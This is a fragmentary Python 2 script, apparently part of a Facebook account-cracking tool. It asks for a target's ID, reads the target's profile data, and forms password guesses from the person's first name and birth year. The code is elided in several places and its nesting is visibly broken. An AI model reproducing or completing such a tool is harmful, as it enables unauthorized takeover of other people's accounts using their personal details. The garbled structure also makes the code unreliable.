...
def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mkrdnawa \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)
...
def pilih_super():
    ...
    if peak == '':
        ...
        if peak == '1':
            ...
            if peak == '2':
                ...
                print logo
                print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m[+] \033[1;96mEnter target ID \033[1;96m: \033[1;97m")
		try:
    ...
    def main(arg):
        ...
        try:
            ...
            b = json.loads(a.text)
            birthday = b['birthday']
            first_sep, last_sep = birthday.find("/"), birthday.rfind("/")
            pass1 = b['first_name'] + birthday[last_sep+1:]
